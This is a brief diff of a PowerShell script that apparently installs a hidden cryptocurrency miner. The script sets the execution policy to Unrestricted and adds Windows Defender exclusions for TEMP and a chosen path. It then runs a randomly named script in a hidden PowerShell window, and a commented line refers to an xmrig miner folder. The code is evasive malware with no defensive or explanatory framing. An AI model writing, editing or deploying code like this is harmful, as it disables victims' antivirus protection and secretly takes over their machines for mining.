@@ -151,10 +151,10 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 cd $initial_dir
 
-Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+Add-MpPreference -ExclusionPath $path
 Add-MpPreference -ExclusionPath "$env:TEMP"
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$initial\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
 
 # Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
 
